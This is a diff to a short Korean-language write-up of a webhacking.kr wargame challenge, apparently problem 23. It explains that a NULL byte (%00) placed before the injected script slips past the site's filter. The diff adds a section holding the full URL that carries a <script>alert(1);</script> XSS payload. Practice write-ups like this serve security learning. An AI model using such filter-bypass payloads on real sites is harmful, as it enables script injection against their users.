@@ -5,3 +5,5 @@
 ![prob23](./img/prob23.png)<br>
 `Your mission is to inject <script>alert(1);</script>`이라고 한다.
 그냥 GET으로 넘길 때 code값 맨 앞에 NULL(%00)을 추가해 주면 풀린다.
+### payload
+`http://webhacking.kr/challenge/bonus/bonus-3/index.php?code=%00<script>alert(1);</script>`
